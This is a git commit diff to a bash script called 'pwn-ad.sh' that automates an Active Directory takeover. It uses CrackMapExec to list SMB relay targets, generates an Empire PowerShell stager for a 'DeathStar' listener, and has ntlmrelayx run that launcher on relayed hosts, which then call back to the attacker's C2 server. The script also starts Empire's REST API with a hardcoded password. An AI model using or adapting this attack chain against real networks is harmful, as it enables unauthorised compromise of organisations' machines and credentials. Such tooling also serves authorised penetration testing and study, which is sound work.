cc4d376d20c9cdb85b589bdc391bc2614fcaf7e9
Ike-Clinton <IkeClinton@gmail.com>
2017-06-08 19:27:22 -0400

    Working on powershell launcher code for command line with ntlmrelayx.py's -c option

--- pwn-ad.sh
+++ pwn-ad.sh
@@ -1,8 +1,38 @@
 #!/bin/bash
 
+while [[ $# -gt 1 ]]
+do
+key="$1"
+
+case $key in
+    -i|--ip)
+    IP_ADDRESS="$2"
+    shift # past argument
+    ;;
+    *)
+            # unknown option
+    ;;
+esac
+shift # past argument or value
+done
+echo IP ADDRESS  = "${IP_ADDRESS}"
+
+
+# Generate targets list given IP Range
+cme smb ${IP_ADDRESS} --gen-relay-list targets.txt
+
+# Generate empire launcher stager powershell payload
+./empire -s launcher -o Listener=DeathStar
+
+# Start ntlmrelayx.
+ntlmrelayx -tf targets.txt -c "power shell launcher"
+
 # Launch Empire with REST API
 cd ../Empire
 python empire --rest --username user --password "T9w0UEhozS5SPq" --restport 13377
+
+# Generate a DeathStar Launcher
+./empire -s launcher -o Listener=DeathStar
 
 # Launch DeathStar and connect to Empire
 cd ../DeathStar
